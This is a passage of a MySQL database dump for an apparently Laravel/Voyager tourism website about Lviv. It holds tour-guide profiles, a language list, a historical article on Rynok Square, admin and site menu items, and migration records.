INSERT INTO `gids` (`id`, `name_uk`, `name_en`, `slug`, `email`, `number`, `number2`, `title_uk`, `title_en`, `post_uk`, `post_en`, `avatar`, `baner_photo`, `created_at`, `updated_at`) VALUES
(8, 'Gid', '', 'gid', 'gid@gmail.com', '38063555555', '38066888888', 'Неповторимый уголок Украины, где уникальным образом сочетались культуры Запада и Востока, молчание старинных зданий с атмосферой современных фестивалей, где будущее чуть засмотрелось на прошлое и приглашает заглянуть к нему в гости ...', '', '<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">Знать исторические факты &ndash; это одно, помочь людям ощутить дух эпохи и получить от такого путешествия незабываемые впечатления &nbsp;- совершенно другое.&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">Преподавая историю, я постоянно совершаю прогулки в прошлое как со студентами, так и с гостями нашего города, и с радостью покажу его вам.&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">Моя история города &ndash; не перечень событий, но и не смесь легенд, поскольку не считаю достойным из прошлого делать фарс. Но самое главное &ndash; это человеческие отношения: учту все ваши пожелания, посоветую, подскажу&hellip; &nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">И рядом со мной Львов никогда не будет для вас чужим.&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px;">&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px; text-align: center;">Приглашаю!&nbsp;</div>\r\n<div style="color: #000000; font-family: \'Lucida Grande\', \'Lucida Sans\', Verdana, Arial, sans-serif; font-size: 13.3333px; text-align: center;">\r\n<div style="font-size: 13.3333px; text-align: left;">\r\n<div style="font-size: 13.3333px;">Кандидат исторических наук, 14-летний опыт работы экскурсоводом с разными категориями посетителей.&nbsp;</div>\r\n<div style="font-size: 13.3333px;">&nbsp;</div>\r\n<div style="font-size: 13.3333px;">Языки: украинский, русский.</div>\r\n<div style="font-size: 13.3333px;">&nbsp;Польский и английский - практикуюсь. Если вас не будет смущать парочка моих ошибок во время экскурсии, то с радостью погуляем с пользой по городу, ну и, конечно, стоимость услуг будет равна стоимости на украинском языке :). Если честно, я перфекционист, стремлюсь к совершенству.&nbsp;</div>\r\n</div>\r\n</div>', '', 'gids/April2018/XEkeSIF8pwszEjfuPWgw.jpg', 'gids/April2018/HrCQFTs4PANSN9ZlcPKc.jpg', '2018-04-27 06:20:13', '2018-04-27 06:20:13'),
(9, 'Пан Іван', '', 'pan-ivan', 'pan_ivan@gmail.com', '380632020202', '380970303003', 'П’ятирічний досвід гіда зробили екскурсії найприємнішою, найпотішнішою, найцікавішою частиною мого життя.', '', '<p><span style="color: #3f4c52; font-family: Lato, sans-serif;">Я - приватний екскурсовод по Львову та Львівській області з більше ніж 7-чним стажем та високою квафікацією.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">Закінчив у 2013р. ЛНУ ім. Івана .Франка. - історичний ф-т. У 2011р. закінчив курси екскурсоводів при фонді св. Володимира.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">За весь цей час провів успішно більше 3000 екскурсій по - найрізноманітнішим маршрутам.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">Володію декількома іноземними мовами, окрім української, проводжу екскурсії ще й на російській, англійській та польській мовах.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">У власності маю легковий мінівен на 5 місць з кондиціонером в ідеальному стані, на якому виконую транспортні екскурсії по Львову та області, в тому числі по Карпатах.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">Проводжу екскурсії по всіх відомих маршрутах, та з радістю їх для Вас скомбіную при потребі.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Середньовічний Львів</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Підземелля Львова</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Автобусна (Транспортна) екскурсія</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Львів Вечірній</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Австрійський Львів</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Личаківське кладовище (в тому числі і нічне)</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Оперний театр</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Шляхетне казино</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Замки Львівщини</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Карпати (заповідник "Сколівські Безкиди")</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- о. Синевир, водоспад Шипіт</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Почаївська Лавра</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Королівська Жовква</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">- Карпатський Трамвайчик&nbsp;</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">Ціни дешеві, для великих груп є знижки.</span><br style="color: #3f4c52; font-family: Lato, sans-serif;" /><span style="color: #3f4c52; font-family: Lato, sans-serif;">Пишіть, дзвоніть, швидко відповідаю.</span></p>', '', 'gids/April2018/zYLUzzRltV8yirG8PDug.jpeg', 'gids/April2018/DFKFjJqNGzP3pPuukKhH.jpg', '2018-04-23 06:56:27', '2018-04-23 07:18:32');

-- --------------------------------------------------------

--
-- Структура таблицы `landings`
--

CREATE TABLE `landings` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `languages`
--

CREATE TABLE `languages` (
  `id` int(11) NOT NULL,
  `code` varchar(10) CHARACTER SET utf8 NOT NULL,
  `short_name` varchar(5) CHARACTER SET utf32 NOT NULL,
  `display_name` varchar(50) CHARACTER SET utf8 NOT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Дамп данных таблицы `languages`
--

INSERT INTO `languages` (`id`, `code`, `short_name`, `display_name`, `status`, `created_at`, `updated_at`) VALUES
(1, 'uk', 'ukr', 'Українська', 1, NULL, NULL),
(2, 'en', 'eng', 'English', 1, NULL, NULL),
(4, 'de', 'deu', 'Deutsch', 0, NULL, '2018-05-16 08:14:49'),
(5, 'cz', '', 'Česky', 0, NULL, NULL),
(6, 'ru', '', 'Русский', 0, NULL, NULL),
(7, 'fr', '', 'Français', 0, NULL, NULL),
(8, 'it', '', 'Italiano', 0, NULL, NULL);

-- --------------------------------------------------------

--
-- Структура таблицы `memories`
--

CREATE TABLE `memories` (
  `id` int(11) NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_uk` text NOT NULL,
  `name_en` text NOT NULL,
  `slug` text NOT NULL,
  `address_uk` text NOT NULL,
  `address_en` text NOT NULL,
  `title_uk` text NOT NULL,
  `title_en` text NOT NULL,
  `post_uk` text NOT NULL,
  `post_en` text NOT NULL,
  `banner_photo` text NOT NULL,
  `photo1` text NOT NULL,
  `photo2` text NOT NULL,
  `photo3` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `google_place_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('PUBLISHED','DRAFT','PENDING') NOT NULL DEFAULT 'DRAFT'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Дамп данных таблицы `memories`
--

INSERT INTO `memories` (`id`, `tag`, `name_uk`, `name_en`, `slug`, `address_uk`, `address_en`, `title_uk`, `title_en`, `post_uk`, `post_en`, `banner_photo`, `photo1`, `photo2`, `photo3`, `created_at`, `updated_at`, `google_place_id`, `status`) VALUES
(1, '', 'Площа Ринок', 'Plosha Rinok', 'plosha-rinok', 'пл. Рынок, Львов, Львовская область', 'frdfdf', 'Площа Ринок – центр політичного, громадського, культурного і торгового життя міста протягом 500 років, серце Львова, історичний початок європеїзації України.', 'Tags', '<h6><sub><strong>Львівська Площа Ринок зберегла свою назву від ХІV століття. Вона походить від німецького «der Ring» (коло, кільце), власне за таким принципом будувалися центральні площі німецьких середньовічних міст.</strong></sub></h6>\r\n<h6><sub><strong>Саме тут, у долині ріки Полтви в середині ХІV століття німецькі колоністи за дорученням короля Казимира ІІІ започаткували класичне європейське місто з класичною ринковою площею. Польський король зводив місто за найдосконалішими тогочасними будівельними технологіями, він запросив для цієї мети ремісників та будівельників з Німеччини. У наступні століття архітектурну досконалість Ринку доповнювали італійські та австрійські архітектори.</strong></sub></h6>\r\n<h6><sub><strong>Площа Ринок у її сучасному вигляді – це нашарування архітектурних ідей багатьох творців і багатьох століть, які утім мають одну єдину особливість – незмінну узгодженість і гармонію. Тут від усіх будівель віє спокоєм, упевненістю, оптимізмом і людяністю епохи європейського ренесансу. Усі кам’яниці площі різні й неповторні, але у той самий час наче споріднені між собою однією ідеєю. Кожна кам’яниця – окремий і завершений образ. Тут феноменально зіставлено величину будинків з людиною, і ми почуваємо себе ніби  в оточенні дуже затишного інтер’єру. Будинки не надто високі й не надто малі, жоден з них не виривається із загального ансамблю своїми розмірами, висотою чи стилем. У львівських ренесансних будинках відчувається справжня музика. Несиметрично розміщені вікна – два поруч і одне ніби осторонь –мають утилітарне призначення: два вікна припадають на головну залу-світлицю, а третє – на бокову, господарську кімнату. Але в цій асиметрії відчувається ритм – ніби спочатку звучать дві половинки ноти, а потім одна ціла нота. Звучання Площі Ринок є неповторним. </strong></sub></h6>\r\n<h6><sub><strong>Львівські середньовічні патриції замовляли проекти своїх будинків здебільшого італійським архітекторам, вихідцям з північної Ломбардії та південної Швейцарії. Але італійський ренесанс не зміг у Львові зберегти свою чистоту і непорушність стилю, він був доповнений і збагачений місцевими традиціями, зокрема рисами східного українського зодчества. Таким чином протягом майже п’яти століть творився єдиний в Україні неповторний ансамбль житлових будинків на Площі Ринок. Майже всі будинки площі і до сьогодні використовуються за своїм основним призначенням – у них мешкають львів’яни.</strong></sub></h6>', 'qweqweqwe', 'memories/May2018/GlzXYWYLDrI3RU7Mc5a1.jpg', 'memories/May2018/Iz58dtgGOEg0NRB8kYDR.jpeg', 'memories/May2018/9Nd1lDAkLVhb1wS4ZfqV.jpg', 'memories/May2018/CRurcYcYuCpqPAvCjKVv.jpeg', '2018-05-07 08:18:00', '2018-05-31 05:34:31', '', 'PUBLISHED');

-- --------------------------------------------------------

--
-- Структура таблицы `menus`
--

CREATE TABLE `menus` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `menus`
--

INSERT INTO `menus` (`id`, `name`, `created_at`, `updated_at`) VALUES
(1, 'admin', '2018-04-05 09:40:17', '2018-04-10 11:33:44'),
(3, 'main-top', '2018-04-10 11:33:57', '2018-04-10 11:33:57');

-- --------------------------------------------------------

--
-- Структура таблицы `menu_items`
--

CREATE TABLE `menu_items` (
  `id` int(10) UNSIGNED NOT NULL,
  `menu_id` int(10) UNSIGNED DEFAULT NULL,
  `title_uk` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `target` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '_self',
  `icon_class` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `color` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `order` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `route` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `parameters` text COLLATE utf8mb4_unicode_ci,
  `template` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `menu_items`
--

INSERT INTO `menu_items` (`id`, `menu_id`, `title_uk`, `title_en`, `url`, `target`, `icon_class`, `color`, `parent_id`, `order`, `created_at`, `updated_at`, `route`, `parameters`, `template`) VALUES
(1, 1, 'Панель', 'Dashboard', '', '_self', 'voyager-boat', NULL, NULL, 1, '2018-04-05 09:40:17', '2018-04-05 09:40:17', 'voyager.dashboard', NULL, ''),
(2, 1, 'Медіа', 'Media', '', '_self', 'voyager-images', NULL, NULL, 4, '2018-04-05 09:40:17', '2018-05-25 05:11:13', 'voyager.media.index', NULL, ''),
(3, 1, 'Новини', 'News', '', '_self', 'voyager-news', NULL, NULL, 5, '2018-04-05 09:40:17', '2018-05-25 05:11:13', 'voyager.posts.index', 'null', ''),
(4, 1, 'Користувачи', 'Users', '', '_self', 'voyager-person', NULL, NULL, 3, '2018-04-05 09:40:17', '2018-05-25 05:11:13', 'voyager.users.index', NULL, ''),
(5, 1, 'Категорії', 'Categories', '', '_self', 'voyager-categories', NULL, NULL, 11, '2018-04-05 09:40:17', '2018-05-25 05:11:30', 'voyager.categories.index', NULL, ''),
(6, 1, 'Сторінки', 'Pages', 'admin/pages', '_self', 'voyager-file-text', NULL, NULL, 10, '2018-04-05 09:40:17', '2018-05-25 05:11:30', NULL, '', ''),
(7, 1, 'Ролі', 'Roles', '', '_self', 'voyager-lock', NULL, NULL, 2, '2018-04-05 09:40:17', '2018-05-25 05:11:13', 'voyager.roles.index', NULL, ''),
(9, 1, 'Конструктор меню', 'Menu Builder', '', '_self', 'voyager-list', NULL, NULL, 13, '2018-04-05 09:40:17', '2018-05-25 05:11:16', 'voyager.menus.index', NULL, ''),
(10, 1, 'База Данних', 'Database', '', '_self', 'voyager-data', NULL, NULL, 14, '2018-04-05 09:40:17', '2018-05-25 05:11:16', 'voyager.database.index', NULL, ''),
(11, 1, 'Компас', 'Compass', '', '_self', 'voyager-compass', NULL, NULL, 15, '2018-04-05 09:40:17', '2018-05-25 05:11:16', 'voyager.compass.index', NULL, ''),
(12, 1, 'Налаштування', 'Settings', '', '_self', 'voyager-settings', NULL, NULL, 16, '2018-04-05 09:40:17', '2018-05-24 09:22:07', 'voyager.settings.index', NULL, ''),
(14, 3, 'Вже і зараз', 'Now', '', '_self', NULL, '#000000', NULL, 1, '2018-04-10 11:36:17', '2018-04-16 16:07:00', NULL, NULL, 'now'),
(15, 3, 'Твій Львів', 'Your Lviv', '', '_self', NULL, NULL, NULL, 2, NULL, '2018-04-16 16:07:01', NULL, NULL, 'lviv'),
(16, 3, 'Події', 'Events', '', '_self', NULL, NULL, NULL, 3, NULL, '2018-04-16 16:07:02', NULL, NULL, 'events'),
(17, 3, 'Сплануй', 'Planning', '', '_self', NULL, NULL, NULL, 4, NULL, '2018-04-16 16:07:03', NULL, NULL, 'planning'),
(18, 3, 'Для бізнесу', 'Businnes', '', '_self', NULL, NULL, NULL, 5, NULL, '2018-04-16 16:07:03', NULL, NULL, 'business'),
(19, 3, 'Свіжі новини', 'Fresh news', '/now/page-news', '_self', NULL, NULL, 14, 1, NULL, '2018-04-11 04:43:06', NULL, NULL, ''),
(21, 3, 'Актуальні події', NULL, '', '_self', NULL, '#000000', 14, 2, '2018-04-11 04:43:30', '2018-04-16 10:38:10', NULL, '', NULL),
(22, 3, 'Рекомендовані', NULL, '', '_self', NULL, '#000000', 14, 3, '2018-04-11 04:43:39', '2018-04-16 10:38:10', NULL, '', NULL),
(23, 3, 'Топові місця', NULL, '', '_self', NULL, '#000000', 14, 5, '2018-04-11 04:43:48', '2018-04-16 10:38:18', NULL, '', NULL),
(24, 3, 'City Card', 'City Card', 'now/lviv-city-card', '_self', NULL, '#000000', 14, 4, '2018-04-11 04:43:58', '2018-04-27 04:55:42', NULL, '', NULL),
(25, 3, 'До Львова', NULL, '', '_self', NULL, '#000000', 17, 1, '2018-04-11 04:45:09', '2018-04-11 04:49:01', NULL, '', NULL),
(26, 3, 'Громадський транспорт', NULL, '', '_self', NULL, '#000000', 17, 2, '2018-04-11 04:45:17', '2018-04-16 10:58:07', NULL, '', NULL),
(27, 3, 'Де зупинитись', NULL, '', '_self', NULL, '#000000', 17, 3, '2018-04-11 04:45:28', '2018-04-16 16:23:51', NULL, '', NULL),
(28, 3, 'Путівники та карти', NULL, '', '_self', NULL, '#000000', 17, 4, '2018-04-11 04:48:23', '2018-04-16 16:23:51', NULL, '', NULL),
(29, 3, 'Все що треба знати', NULL, '', '_self', NULL, '#000000', 17, 5, '2018-04-11 04:48:41', '2018-04-16 16:23:51', NULL, '', NULL),
(30, 3, 'Мистецтво та культура', NULL, '', '_self', NULL, '#000000', 16, 1, '2018-04-11 04:49:40', '2018-04-11 04:51:03', NULL, '', NULL),
(31, 3, 'Фестивалі', NULL, '', '_self', NULL, '#000000', 16, 2, '2018-04-11 04:49:48', '2018-04-11 04:51:09', NULL, '', NULL),
(32, 3, 'Для дітей', NULL, '', '_self', NULL, '#000000', 16, 3, '2018-04-11 04:49:58', '2018-04-11 04:51:13', NULL, '', NULL),
(33, 3, 'Спорт', NULL, '', '_self', NULL, '#000000', 16, 4, '2018-04-11 04:50:13', '2018-04-11 04:51:16', NULL, '', NULL),
(34, 3, 'Бізнес конференції', NULL, '', '_self', NULL, '#000000', 16, 5, '2018-04-11 04:50:26', '2018-04-11 04:51:22', NULL, '', NULL),
(35, 3, 'Театр', NULL, '', '_self', NULL, '#000000', 16, 6, '2018-04-11 04:50:48', '2018-04-11 04:51:26', NULL, '', NULL),
(36, 3, 'Їжа та напої', NULL, '/your-lviv/food-and-drinks', '_self', '', '#000000', 15, 1, '2018-04-11 04:51:44', '2018-04-11 04:54:23', NULL, '', NULL),
(37, 3, 'Памʼятки', 'Sights', '/memories', '_self', NULL, '#000000', 15, 2, '2018-04-11 04:51:53', '2018-05-07 08:30:25', NULL, '', NULL),
(38, 3, 'Музеї та галереї', 'Museums and galleries', '/museums', '_self', NULL, '#000000', 15, 3, '2018-04-11 04:52:09', '2018-05-07 08:30:03', NULL, '', NULL),
(39, 3, 'Парки', 'Parks', '/parks', '_self', NULL, '#000000', 15, 5, '2018-04-11 04:52:26', '2018-05-07 11:26:37', NULL, '', NULL),
(40, 3, 'Театри/Філармонії', 'Theaters / Philharmonic', '/teatrs', '_self', NULL, '#000000', 15, 6, '2018-04-11 04:52:35', '2018-05-11 05:46:03', NULL, '', NULL),
(41, 3, 'Громадські місця', 'Public places', '/public-places', '_self', NULL, '#000000', 15, 7, '2018-04-11 04:52:43', '2018-05-11 05:44:50', NULL, '', NULL),
(42, 3, 'Тури', 'Tours', '/tur', '_self', NULL, '#000000', 15, 8, '2018-04-11 04:52:53', '2018-05-11 05:44:50', NULL, '', NULL),
(43, 3, 'Навколо Львова', 'Around Lviv', '/around_lviv', '_self', NULL, '#000000', 15, 9, '2018-04-11 04:53:01', '2018-05-11 06:51:43', NULL, '', NULL),
(44, 3, 'Аттракції', NULL, '', '_self', NULL, '#000000', 15, 4, '2018-04-11 04:55:26', '2018-05-07 08:30:03', NULL, '', NULL),
(45, 3, 'Lviv Convention Bureau', NULL, '', '_self', NULL, '#000000', 18, 1, '2018-04-11 04:56:45', '2018-04-11 04:57:13', NULL, '', NULL),
(46, 3, 'Invest in Lviv', NULL, '', '_self', NULL, '#000000', 18, 2, '2018-04-11 04:56:53', '2018-04-11 04:57:14', NULL, '', NULL),
(47, 3, 'Загальна інформація про Львів + Міні історія', NULL, '', '_self', NULL, '#000000', 18, 3, '2018-04-11 04:57:03', '2018-04-11 04:57:15', NULL, '', NULL),
(48, 3, 'Запланувати конференцію у Львові', NULL, '', '_self', NULL, '#000000', 45, 1, '2018-04-11 04:57:30', '2018-04-11 04:58:31', NULL, '', NULL),
(49, 3, 'Про LCB', NULL, '', '_self', NULL, '#000000', 45, 2, '2018-04-11 04:58:39', '2018-04-13 06:45:59', NULL, '', NULL),
(50, 3, 'Календар подій - комерційне застосування', NULL, '', '_self', NULL, '#000000', 45, 3, '2018-04-11 04:58:51', '2018-04-13 06:45:59', NULL, '', NULL),
(51, 3, 'Реалізовані події (Амбасадори)', NULL, '', '_self', NULL, '#000000', 45, 4, '2018-04-11 04:59:19', '2018-04-13 06:45:59', NULL, '', NULL),
(52, 3, 'Замовити FAM-тур', NULL, '', '_self', NULL, '#000000', 45, 5, '2018-04-11 04:59:30', '2018-04-13 06:45:59', NULL, '', NULL),
(53, 3, 'Локації для проведення комерційних подій у Львові', NULL, '', '_self', NULL, '#000000', 45, 6, '2018-04-11 04:59:41', '2018-04-13 06:45:59', NULL, '', NULL),
(54, 3, 'Чому Львів', NULL, '', '_self', NULL, '#000000', 46, 1, '2018-04-11 05:00:48', '2018-05-16 04:42:16', NULL, '', NULL),
(55, 3, 'Пріорітетні галузі', NULL, '', '_self', NULL, '#000000', 46, 3, '2018-04-11 05:00:55', '2018-05-16 04:43:00', NULL, '', NULL),
(56, 3, 'Інвестиційні проекти', NULL, '', '_self', NULL, '#000000', 46, 4, '2018-04-11 05:01:04', '2018-05-16 04:43:00', NULL, '', NULL),
(57, 3, 'Професійні події', NULL, '', '_self', NULL, '#000000', 46, 5, '2018-04-11 05:01:15', '2018-05-16 04:43:01', NULL, '', NULL),
(58, 3, 'Блог з основними фактами', NULL, '', '_self', NULL, '#000000', 46, 6, '2018-04-11 05:01:24', '2018-05-16 04:43:01', NULL, '', NULL),
(61, 1, 'Гид', 'Gid', '/admin/gids', '_self', 'voyager-world', NULL, NULL, 8, '2018-04-19 08:02:40', '2018-05-25 05:11:13', NULL, '', NULL),
(62, 1, 'Екскурсії', 'Excursions', '/admin/excursions', '_self', 'voyager-bomb', NULL, NULL, 9, '2018-04-19 08:49:06', '2018-05-25 05:11:29', NULL, '', NULL),
(63, 1, 'Подія', 'Event', '/admin/developments', '_self', 'voyager-documentation', NULL, NULL, 6, '2018-04-19 10:55:32', '2018-05-25 05:11:13', NULL, '', NULL),
(64, 1, 'Місця', 'Places', '', '_self', NULL, NULL, NULL, 7, '2018-05-02 07:09:50', '2018-05-25 05:11:13', NULL, '', NULL),
(66, 1, 'Театри', 'Theatres', '/admin/theatres', '_self', NULL, NULL, 64, 2, '2018-05-02 07:11:47', '2018-06-06 03:43:39', NULL, '', NULL),
(67, 1, 'Памʼятки', 'Sights', '/admin/memories', '_self', NULL, NULL, 64, 3, '2018-05-02 07:12:41', '2018-05-24 09:22:07', NULL, '', NULL),
(68, 1, 'Аттракції', 'Attractions', '', '_self', NULL, NULL, 64, 5, '2018-05-02 07:13:22', '2018-05-24 09:22:07', NULL, '', NULL),
(69, 1, 'Парки', 'Parks', '/admin/parks', '_self', NULL, NULL, 64, 4, '2018-05-02 07:13:59', '2018-05-24 09:22:07', NULL, '', NULL),
(70, 1, 'Громадські місця', 'Public places', '/admin/public-places', '_self', NULL, NULL, 64, 6, '2018-05-02 07:14:36', '2018-05-24 09:22:07', NULL, '', NULL),
(72, 1, 'Навколо Львова', 'Around Lviv', '/admin/around-lvivs', '_self', NULL, NULL, 64, 7, '2018-05-02 07:15:44', '2018-05-24 09:22:07', NULL, '', NULL),
(73, 1, 'Музеї та галереї', 'Museums and galleries', '/admin/museums', '_self', NULL, NULL, 64, 1, '2018-05-04 08:24:50', '2018-05-07 07:49:03', NULL, '', NULL),
(75, 1, 'Мова', 'Languages', '/admin/languages', '_self', NULL, NULL, NULL, 18, '2018-05-16 08:08:08', '2018-05-25 06:44:02', NULL, '', NULL),
(78, 1, 'Лендінги', 'Landings', '', '_self', NULL, NULL, NULL, 19, '2018-05-18 09:07:24', '2018-05-25 06:43:59', NULL, '', NULL),
(79, 1, 'Головна', 'Main Page', 'admin/landings/1', '_self', NULL, NULL, 78, 1, '2018-05-18 09:32:22', '2018-05-18 09:32:29', NULL, '', NULL),
(80, 1, 'Твій Львів', 'Your Lviv', 'admin/landings/2', '_self', NULL, NULL, 78, 2, '2018-05-18 09:33:57', '2018-05-18 09:34:05', NULL, '', NULL),
(81, 1, 'Події', 'Events', 'admin/landings/3', '_self', NULL, NULL, 78, 3, '2018-05-18 09:35:30', '2018-05-18 09:36:15', NULL, '', NULL),
(82, 1, 'Сплануй', 'Planning', 'admin/landings/4', '_self', NULL, NULL, 78, 4, '2018-05-18 09:36:10', '2018-05-18 09:36:17', NULL, '', NULL),
(83, 1, 'Бізнес', 'Business', 'admin/landings/5', '_self', NULL, NULL, 78, 5, '2018-05-18 09:37:29', '2018-05-18 09:37:34', NULL, '', NULL),
(86, 1, 'Теги', 'Tags', 'admin/tags', '_self', NULL, NULL, NULL, 12, '2018-05-24 09:32:17', '2018-05-25 05:11:30', NULL, '', NULL),
(87, 1, 'Слайдери', 'Sliders', 'admin/sliders', '_self', NULL, NULL, NULL, 17, '2018-05-25 05:54:08', '2018-05-25 06:44:02', NULL, '', NULL);

-- --------------------------------------------------------

--
-- Структура таблицы `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1),
(3, '2016_01_01_000000_add_voyager_user_fields', 1),
(4, '2016_01_01_000000_create_data_types_table', 1),
(5, '2016_01_01_000000_create_pages_table', 2),
(6, '2016_01_01_000000_create_posts_table', 2),
(7, '2016_02_15_204651_create_categories_table', 3),
(8, '2016_05_19_173453_create_menu_table', 3),
(9, '2016_10_21_190000_create_roles_table', 3),
(10, '2016_10_21_190000_create_settings_table', 3),
(11, '2016_11_30_135954_create_permission_table', 4),
(12, '2016_11_30_141208_create_permission_role_table', 4),
(13, '2016_12_26_201236_data_types__add__server_side', 4),
(14, '2017_01_13_000000_add_route_to_menu_items_table', 4),
(15, '2017_01_14_005015_create_translations_table', 5),
(16, '2017_01_15_000000_add_permission_group_id_to_permissions_table', 5),
(17, '2017_01_15_000000_create_permission_groups_table', 5),
(18, '2017_01_15_000000_make_table_name_nullable_in_permissions_table', 5),
(19, '2017_03_06_000000_add_controller_to_data_types_table', 5),
(20, '2017_04_11_000000_alter_post_nullable_fields_table', 5),
(21, '2017_04_21_000000_add_order_to_data_rows_table', 5),
(22, '2017_07_05_210000_add_policyname_to_data_types_table', 5),
(23, '2017_08_05_000000_add_group_to_settings_table', 5),
(24, '2017_06_16_113106_create_owners_table', 6),
(25, '2018_04_18_135502_add_posts_column_image1', 7);

-- --------------------------------------------------------

--
-- Структура таблицы `museums`
--

CREATE TABLE `museums` (
  `id` int(11) NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) NOT NULL,
  `slug` varchar(255) NOT NULL,
  `address` text NOT NULL,
  `number` varchar(255) NOT NULL,
  `number2` varchar(255) NOT NULL,
